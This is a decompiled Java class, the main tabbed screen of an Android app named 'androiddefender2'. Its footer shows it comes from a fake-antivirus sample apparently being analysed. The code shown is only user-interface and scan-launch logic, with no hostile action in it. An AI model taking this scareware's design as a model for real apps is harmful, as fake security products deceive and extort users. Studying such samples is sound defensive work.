package com.example.androiddefender2;

import android.app.TabActivity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.widget.ImageView;
import android.widget.TabHost;
import designer.TabsOperation;
import system.AppSingleton;

public class MainActivity extends TabActivity {
  public void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903043);
    (AppSingleton.getInstance()).history.clear();
    ImageView imageView = (ImageView)findViewById(2131296291);
    if (!(AppSingleton.getInstance()).activaten) {
      imageView.setImageResource(2130837536);
    } else {
      imageView.setImageResource(2130837535);
    } 
    (DefenderApplication.getInstance()).tabHost = getTabHost();
    TabsOperation tabsOperation = new TabsOperation();
    (DefenderApplication.getInstance()).tabHost.addTab(tabsOperation.generateTabSpec("Home", (Context)this, HomeActivity.class, (DefenderApplication.getInstance()).tabHost, 2130837539));
    (DefenderApplication.getInstance()).tabHost.addTab(tabsOperation.generateTabSpec("Update", (Context)this, UpdateActivity.class, (DefenderApplication.getInstance()).tabHost, 2130837545));
    (DefenderApplication.getInstance()).tabHost.addTab(tabsOperation.generateTabSpec("Settings", (Context)this, SettingsActivity.class, (DefenderApplication.getInstance()).tabHost, 2130837543));
    (DefenderApplication.getInstance()).tabHost.addTab(tabsOperation.generateTabSpec("Privacy", (Context)this, PrivacyActivity.class, (DefenderApplication.getInstance()).tabHost, 2130837542));
    (DefenderApplication.getInstance()).tabHost.addTab(tabsOperation.generateTabSpec("Support", (Context)this, SupportActivity.class, (DefenderApplication.getInstance()).tabHost, 2130837544));
    String str2 = getLocalActivityManager().getCurrentId();
    String str1 = str2;
    if (str2.equals(""))
      str1 = "Home"; 
    (AppSingleton.getInstance()).history.add(str1);
    (DefenderApplication.getInstance()).tabHost.setOnTabChangedListener(new TabHost.OnTabChangeListener() {
          public void onTabChanged(String param1String) {
            if (param1String.equals("Home")) {
              HomeActivity.self.onCreate(null);
            } else if (param1String.equals("Update")) {
              UpdateActivity.self.onCreate(null);
            } else if (param1String.equals("Settings")) {
              SettingsActivity.self.onCreate(null);
            } else if (param1String.equals("Privacy")) {
              PrivacyActivity.self.onCreate(null);
            } else if (param1String.equals("Support")) {
              SupportActivity.self.onCreate(null);
            } 
            param1String = MainActivity.this.getLocalActivityManager().getCurrentId();
            (AppSingleton.getInstance()).history.add(param1String);
          }
        });
    if (getIntent().getBooleanExtra("byAppDolbal", false)) {
      (DefenderApplication.getInstance()).tabHost.setCurrentTab(4);
    } else {
      (DefenderApplication.getInstance()).tabHost.setCurrentTab(0);
    } 
    if (!(DefenderApplication.getInstance()).makeFirstScan) {
      Intent intent = new Intent((Context)this, SingleScanActivity.class);
      intent.putExtra("scanApplication", true);
      intent.putExtra("scanSDCard", false);
      startActivity(intent);
    } 
  }
  
  public boolean onCreateOptionsMenu(Menu paramMenu) {
    getMenuInflater().inflate(2131230722, paramMenu);
    return true;
  }
  
  public void onRestoreInstanceState(Bundle paramBundle) {
    super.onRestoreInstanceState(paramBundle);
    int i = paramBundle.getInt("CurrentTab", 0);
    (DefenderApplication.getInstance()).tabHost.setCurrentTab(i);
    if (paramBundle.getString("CurrentActivity").equals("StartScan"));
  }
  
  protected void onResume() {
    getIntent().getBooleanExtra("byAppDolbal", false);
    super.onResume();
  }
  
  public void onSaveInstanceState(Bundle paramBundle) {
    super.onSaveInstanceState(paramBundle);
    paramBundle.putInt("CurrentTab", (DefenderApplication.getInstance()).tabHost.getCurrentTab());
    int i = (AppSingleton.getInstance()).history.size();
    paramBundle.putString("CurrentActivity", (AppSingleton.getInstance()).history.get(i - 1));
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/example/androiddefender2/MainActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */